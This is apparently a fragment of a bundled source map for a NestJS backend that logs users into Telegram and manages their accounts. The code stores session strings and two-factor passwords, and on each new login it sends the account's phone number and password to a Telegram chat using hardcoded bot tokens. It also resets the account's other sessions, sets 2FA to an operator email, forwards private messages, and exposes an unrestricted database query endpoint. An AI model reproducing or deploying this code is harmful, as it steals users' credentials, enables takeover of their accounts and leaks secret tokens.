string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n\n  \n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\r\nimport { UsersService } from './users.service';\r\nimport { User } from './schemas/user.schema';\r\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\r\nimport { SearchUserDto } from './dto/search-user.dto';\r\nimport { UpdateUserDto } from './dto/update-user.dto';\r\nimport { CreateUserDto } from './dto/create-user.dto';\r\n\r\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\r\n@Controller('user')\r\nexport class UsersController {\r\n  constructor(private readonly usersService: UsersService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new user' })\r\n  async create(@Body() createUserDto: CreateUserDto) {\r\n    console.log(\"creating new user\")\r\n    return this.usersService.create(createUserDto);\r\n  }\r\n\r\n  @Get('/search')\r\n  @ApiOperation({ summary: 'Search users based on various parameters' })\r\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\r\n    return this.usersService.search(queryParams);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all users' })\r\n  async findAll() {\r\n    return this.usersService.findAll();\r\n  }\r\n\r\n  @Get(':tgId')\r\n  @ApiOperation({ summary: 'Get a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async findOne(@Param('tgId') tgId: string) {\r\n    return this.usersService.findOne(tgId);\r\n  }\r\n\r\n  @Patch(':tgId')\r\n  @ApiOperation({ summary: 'Update a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\r\n    return this.usersService.update(tgId, updateUserDto);\r\n  }\r\n\r\n  @Delete(':tgId')\r\n  @ApiOperation({ summary: 'Delete a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async remove(@Param('tgId') tgId: string) {\r\n    return this.usersService.delete(tgId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.usersService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UsersService } from './users.service';\r\nimport { UsersController } from './users.controller';\r\nimport { UserSchema } from './schemas/user.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => ClientModule)\r\n  ],\r\n  controllers: [UsersController],\r\n  providers: [UsersService],\r\n  exports: [UsersService]\r\n})\r\nexport class UsersModule { }\r\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { fetchWithTimeout, ppplbot } from '../../utils';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) {}\n\n  async create(user: CreateUserDto): Promise<User> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","import { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  app.use((req, res, next) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(8000);\n}\nbootstrap();\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout, parseError, ppplbot } from '../utils';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","import axios, { AddressFamily, AxiosRequestConfig } from 'axios';\n\nexport function sleep(ms) {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\nexport function contains(str, arr) {\n  return (arr.some(element => {\n    if (str?.includes(element)) {\n      return true;\n    }\n    return false;\n  }))\n};\n\n\nexport async function fetchWithTimeout(resource: string, options: AxiosRequestConfig = {}, maxRetries = 1) {\n  options.timeout = options.timeout || 50000;\n  options.method = options.method || 'GET';\n\n  const fetchWithProtocol = async (url: string, version: AddressFamily) => {\n    const source = axios.CancelToken.source();\n    const id = setTimeout(() => {\n      source.cancel(`Request timed out after ${options.timeout}ms`);\n    }, options.timeout);\n\n    try {\n      const response = await axios({\n        ...options,\n        url,\n        headers: { 'Content-Type': 'application/json' },\n        cancelToken: source.token,\n        family: version\n      });\n      clearTimeout(id);\n      return response;\n    } catch (error) {\n      clearTimeout(id);\n      console.log(`Error at URL (IPv${version}): `, url);\n      parseError(error);\n      if (axios.isCancel(error)) {\n        console.log('Request canceled:', error.message, url);\n        return undefined;\n      }\n      throw error; // Rethrow the error to handle retry logic outside\n    }\n  };\n\n  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {\n    try {\n      // First try with IPv4\n      const responseIPv4 = await fetchWithProtocol(resource, 4);\n      if (responseIPv4) return responseIPv4;\n\n      // If IPv4 fails, try with IPv6\n      const responseIPv6 = await fetchWithProtocol(resource, 6);\n      if (responseIPv6) return responseIPv6;\n    } catch (error) {\n      console.log(\"Error at URL : \", resource)\n      const errorDetails = parseError(error)\n      if (retryCount < maxRetries && error.code !== 'ERR_NETWORK' && error.code !== \"ECONNABORTED\" && error.code !== \"ETIMEDOUT\" && !errorDetails.message.toLowerCase().includes('too many requests') && !axios.isCancel(error)) {\n        console.log(`Retrying... (${retryCount + 1}/${maxRetries})`);\n        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay\n      } else {\n        console.log(`All ${maxRetries + 1} retries failed for ${resource}`);\n        return undefined;\n      }\n    }\n  }\n}\n\nexport function toBoolean(value: string | number | boolean): boolean {\n  if (typeof value === 'string') {\n    return value.toLowerCase() === 'true';\n  }\n  if (typeof value === 'number') {\n    return value === 1;\n  }\n  return value\n}\n\nexport function fetchNumbersFromString(inputString) {\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  if (matches) {\n    const result = matches.join('');\n    return result;\n  } else {\n    return '';\n  }\n}\n\nexport function parseError(\n  err,\n  prefix = 'TgCms',\n) {\n  let status = 'UNKNOWN';\n  let message = 'An unknown error occurred';\n  let error = 'UnknownError';\n\n  const extractMessage = (data) => {\n    if (Array.isArray(data)) {\n      const messages = data.map((item) => extractMessage(item));\n      return messages.filter((message) => message !== undefined).join(', ');\n    } else if (typeof data === 'string') {\n      return data;\n    } else if (typeof data === 'object' && data !== null) {\n      let resultString = ''\n      for (const key in data) {\n        const value = data[key]\n        if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {\n          resultString = resultString + data[key].join(', ');\n        } else {\n          const result = extractMessage(value);\n          if (result) {\n            resultString = resultString + result;\n          }\n        }\n      }\n      return resultString\n    }\n    return JSON.stringify(data);\n  };\n\n  if (err.response) {\n    const response = err.response;\n    status =\n      response.data?.status ||\n      response.status ||\n      err.status ||\n      'UNKNOWN';\n    message =\n      response.data?.message ||\n      response.data?.errors ||\n      response.errorMessage ||\n      response.message ||\n      response.statusText ||\n      response.data ||\n      err.message ||\n      'An error occurred';\n    error =\n      response.data?.error ||\n      response.error ||\n      err.name ||\n      err.code ||\n      'Error';\n  } else if (err.request) {\n    status = err.status || 'NO_RESPONSE';\n    message = err.data?.message ||\n      err.data?.errors ||\n      err.message ||\n      err.statusText ||\n      err.data ||\n      err.message || 'The request was triggered but no response was received';\n    error = err.name || err.code || 'NoResponseError';\n  } else if (err.message) {\n    status = err.status || 'UNKNOWN';\n    message = err.message;\n    error = err.name || err.code || 'Error';\n  } else if (err.errorMessage) {\n    status = err.status || 'UNKNOWN';\n    message = err.errorMessage;\n    error = err.name || err.code || 'Error';\n  }\n\n  const msg = `${prefix ? `${prefix} ::` : \"\"} ${extractMessage(message)} `\n\n  const resp = { status, message: err.errorMessage || msg, error };\n  console.log(resp.error == 'RPCError' ? resp.message : resp);\n  return resp\n}\nlet botCount = 0;\n\nexport function ppplbot(chatId?: string, botToken?: string) {\n  let token = botToken;\n\n  if (!token) {\n    if (botCount % 2 === 1) {\n      token = 'bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY';\n    } else {\n      token = 'bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA';\n    }\n    botCount++;\n  }\n  const targetChatId = chatId || '-1001801844217'; // Replace with actual chat ID\n  const apiUrl = `https://api.telegram.org/${token}/sendMessage?chat_id=${targetChatId}`;\n  return apiUrl;\n};\n\nexport const defaultReactions = [\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\n  '👀', '🙈', '🤝', '🤗', '🆒',\n  '🗿', '🙉', '🙊', '🤷', '👎'\n]\nexport const defaultMessages = [\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n];\n\nexport function areJsonsNotSame(json1: any, json2: any): boolean {\n  const keysToIgnore = [\"id\", \"_id\"];\n\n  function deepCompare(obj1: any, obj2: any): boolean {\n    if (obj1 === obj2) return true;\n\n    if (typeof obj1 !== \"object\" || typeof obj2 !== \"object\" || obj1 === null || obj2 === null) {\n      return false;\n    }\n\n    const keys1 = Object.keys(obj1).filter(key => !keysToIgnore.includes(key)).sort();\n    const keys2 = Object.keys(obj2).filter(key => !keysToIgnore.includes(key)).sort();\n\n    if (keys1.length !== keys2.length) return false;\n\n    return keys1.every(key => deepCompare(obj1[key], obj2[key]));\n  }\n\n  return !deepCompare(json1, json2);\n}\n\nexport function mapToJson(map: Map<any, any>) {\n  // Convert Map to a plain object\n  const obj: Record<string, any> = {};\n  for (const [key, value] of map.entries()) {\n    // Convert key to string since JSON keys are always strings\n    obj[String(key)] = value;\n  }\n  return obj\n}\n","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(7927);\n"],"names":["MailReader","isReady","result","this","imap","user","process","env","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","on","console","log","err","error","getInstance","instance","connectToMail","connect","parseError","disconnectFromMail","end","isMailReady","getCode","sleep","openInbox","searchCriteria","fetchOptions","bodies","markSeen","results","Promise","resolve","reject","search","length","fetch","msg","seqno","emailData","stream","info","buffer","chunk","toString","which","push","seq","addFlags","expunge","once","split","fetchNumbersFromString","openBox","AppController","constructor","appService","getHello","uploadFileAndUpdate","file","targetDir","join","__dirname","filePath","existsSync","mkdirSync","recursive","fileBuffer","readFile","path","writeFile","message","Get","Post","UseInterceptors","FileInterceptor","storage","diskStorage","destination","req","cb","folderPath","filename","ApiOperation","summary","ApiConsumes","ApiBody","schema","type","properties","format","UploadedFile","Controller","AppService","AppModule","configure","consumer","apply","LoggerMiddleware","forRoutes","Module","imports","initModule","TelegramModule","ActiveChannelsModule","ClientModule","UserDataModule","UsersModule","BufferClientModule","ArchivedClientModule","ChannelsModule","PromoteClientModule","BuildModule","UpiIdModule","PromoteMsgModule","PromoteStatModule","StatModule","Stat2Module","TgSignupModule","TransactionModule","NpointModule","controllers","providers","exports","Injectable","CloudinaryService","resources","Map","cloudinary","v2","config","cloud_name","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","name","getResourcesFromFolder","downloadAndExtractZip","url","rootPath","cwd","zipPath","extractPath","response","fetchWithTimeout","responseType","status","errorMessage","Error","fs","writeFileSync","data","zip","extractAllTo","unlinkSync","folderName","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","uploader","upload","resource_type","overwrite","invalidate","public_id","findAndSaveResources","api","prefix","max_results","all","map","async","resource","set","extension","substring","lastIndexOf","mypath","res","statusText","saveFile","create_folder","uploadPromises","Array","from","entries","key","upload_large","folder","printResources","forEach","val","get","publicId","getBuffer","Configuration","Schema","versionKey","autoIndex","strict","timestamps","toJSON","virtuals","transform","doc","ret","_id","ConfigurationSchema","SchemaFactory","createForClass","add","Types","Mixed","ConfigurationController","configurationService","findOne","update","updateClientDto","Patch","Object","Body","ApiTags","ConfigurationService","connection","onModuleInit","clientId","ppplbot","encodeURIComponent","onModuleDestroy","closeConnection","close","Global","ConfigModule","forRoot","MongooseModule","forRootAsync","useFactory","uri","mongouri","forFeature","collection","Inject","getConnectionToken","Connection","configurationModel","setEnv","OnModuleInit","exec","NotFoundException","updatedUser","findOneAndUpdate","$set","new","upsert","InjectModel","Model","TelegramController","telegramService","connectToTelegram","mobile","createClient","connectClient","disconnect","deleteClient","disconnectAll","getMessages","username","limit","getMessagesNew","chatId","offset","getChatId","sendInlineMessage","lastActiveTime","getLastActiveTime","joinChannels","channels","removeOtherAuths","getSelfMsgsInfo","createGroup","forwardSecrets","fromId","joinChannelAndForward","channel","leaveChannel","getCallLog","getMe","getMedia","getmedia","getChannelInfo","sendIds","leaveChannels","getAuths","set2Fa","setProfilePic","updatePrivacy","updateUsername","getGrpMembers","addContact","addContactDto","addContacts","addContactsDto","phoneNumbers","newSession","createNewSession","updateName","firstName","about","updateNameandBio","getMediaMetadata","downloadMediaFile","messageId","downloadProfilePic","index","send","download","unlink","forrward","forwardMessage","deleteChat","deleteProfilePics","deleteProfilePhotos","ApiParam","description","required","Param","ApiQuery","Query","String","AddContactDto","ApiResponse","example","success","addedContacts","AddContactsDto","Res","TelegramService","forwardRef","usersService","bufferClientService","activeChannelsService","channelsService","getActiveClientSetup","setActiveClientSetup","getClient","number","client","clientsMap","connected","hasClient","has","cli","delete","phoneNumber","clear","clearJoinChannelInterval","autoDisconnect","handler","BadRequestException","telegramManager","session","setTimeout","setInterval","errorDetails","contains","toLowerCase","updateByFilter","$or","tgId","expired","telegramClient","getchatId","tryJoiningChannel","chatEntity","joinChannel","canSendMsgs","remove","channelId","removeChannels","includes","channelDetails","searchError","private","entity","getSelfMSgsInfo","fromChatId","createGroupAndForward","getMediaMessages","getDialogs","archived","channelInfo","set2fa","HttpException","parseInt","updatePrivacyforDeletedAccount","updateProfilePic","leaveChannelIds","canSendFalseChats","updateProfile","UsersService","ActiveChannelsService","ChannelsService","BufferClientService","TelegramManager","sessionString","StringSession","channelArray","activeClientSetup","groupDescription","invoke","Api","CreateChannel","title","megagroup","forImport","id","accessHash","chats","folders","EditPeerFolders","folderPeers","InputFolderPeer","peer","InputPeerChannel","folderId","InviteToChannel","InputChannel","users","forwardSecretMsgs","toChatId","totalMessages","forwardedCount","messages","offsetId","total","messageIds","media","filter","undefined","forwardMessages","fromPeer","i","slice","_destroyed","getInputEntity","errorHandler","handlerFn","TelegramClient","API_ID","API_HASH","connectionRetries","setLogLevel","LogLevel","ERROR","_errorHandler","me","phone","addEventHandler","event","NewMessage","handleEvents","chat","getEntity","Chat","Channel","participants","GetParticipants","ChannelParticipantsRecent","hash","ChannelParticipants","userInfo","ChannelParticipant","userId","userDetails","lastName","JSON","stringify","entityLike","params","getLastMsgs","msgs","resp","text","selfChatId","photoCount","ownPhotoCount","ownVideoCount","otherPhotoCount","otherVideoCount","videoCount","movieCount","messageHistory","toLocaleLowerCase","photo","fwdFrom","video","canSendTrueCount","canSendFalseCount","totalCount","isChannel","isGroup","broadcast","defaultBannedRights","sendMessages","replace","chatsArrayLength","ids","namePrefix","contacts","AddContact","e","mobiles","inputContacts","InputPhoneContact","ImportContacts","LeaveChannel","JoinChannel","account","GetAuthorizations","auth","authorizations","isAuthMine","appName","country","deviceModel","resetAuthorization","ResetAuthorization","getAllChats","chatData","className","thumbnailUrl","getMediaUrl","date","sender","senderId","is_self","out","MessageMediaPhoto","sizes","downloadMedia","thumb","MessageMediaDocument","document","mimeType","startsWith","thumbs","button","sendMessage","buttons","KeyboardButtonUrl","Search","InputPeerEmpty","q","InputMessagesFilterPhotos","minDate","maxDate","addOffset","maxId","minId","callLogs","InputMessagesFilterPhoneCalls","action","MessageActionPhoneCall","filteredResults","outgoing","incoming","chatCallCounts","totalCalls","logAction","peerId","ent","count","filteredChatCallCounts","details","isPrivate","Date","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","UpdateProfile","photoIndex","photos","GetUserPhotos","selectedPhoto","Math","max","photoFileSize","photoBuffer","downloadFile","InputPhotoFileLocation","fileReference","thumbSize","dcId","outputPath","latest","dateActive","toISOString","getContacts","GetContacts","DeleteHistory","justClear","revoke","blockUser","Block","downloadWithTimeout","promise","timeout","race","_","query","mediaMessages","endOfMessages","thumbBuffer","mediaType","downloadError","warn","retryAfter","match","MessageMediaEmpty","contentType","fileLocation","inputLocation","InputDocumentFileLocation","setHeader","chunkSize","iterDownload","requestSize","write","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","InputPrivacyKeyForwards","getFileUrl","writer","createWriteStream","pipe","image","uploadFile","CustomFile","statSync","size","workers","UploadProfilePhoto","hasPassword","GetPassword","imapService","twoFaDetails","email","hint","newPassword","checkMailInterval","clearInterval","updateTwoFaSettings","isCheckPassword","emailCodeCallback","retry","codeInterval","code","onEmailCodeError","sendPhotoChat","caption","sendFile","sendFileChat","DeletePhotos","newClient","start","phoneCode","waitForOtp","onError","save","now","trim","ApiProperty","TgSignupController","TgSignupService","logger","Logger","cleanupInterval","cleanupStaleSessions","SESSION_CLEANUP_INTERVAL","phones","activeClients","keys","disconnectClient","getRandomCredentials","floor","random","API_CREDENTIALS","validatePhoneNumber","test","clearTimeout","timeoutId","destroy","sendCode","debug","apiId","apiHash","retryDelay","useWSS","sendResult","SendCode","settings","CodeSettings","currentNumber","allowAppHash","SentCodeSuccess","LOGIN_TIMEOUT","phoneCodeHash","createdAt","isCodeViaApp","SentCodeTypeApp","stack","verifyCode","signInResult","SignIn","AuthorizationSignUpRequired","handleNewUserRegistration","userData","processLoginResult","handle2FALogin","requires2FA","passwordSrpResult","passwordCheck","computeCheck","CheckPassword","randomName","signUpResult","SignUp","twoFA","lastActive","personalChats","totalChats","recentUsers","calls","gender","create","InternalServerErrorException","PHONE_PREFIX","SendCodeDto","IsString","IsNotEmpty","Matches","VerifyCodeDto","IsOptional","Transform","value","TgSignupResponse","tgSignupService","sendCodeDto","hasPhoneCodeHash","HttpStatus","CREATED","parsedError","errorType","verifyCodeDto","hasSession","OK","BAD_REQUEST","statusCode","TOO_MANY_REQUESTS","INTERNAL_SERVER_ERROR","UsePipes","ValidationPipe","whitelist","forbidNonWhitelisted","transformOptions","enableImplicitConversion","ApiExtraModels","ActiveChannelsController","createActiveChannelDto","createMultiple","createChannelDtos","findAll","updateActiveChannelDto","addReaction","addReactionDto","reactions","addReactions","getRandomReaction","removeReaction","CreateActiveChannelDto","Boolean","Number","UpdateActiveChannelDto","Delete","AddReactionDto","ActiveChannel","Active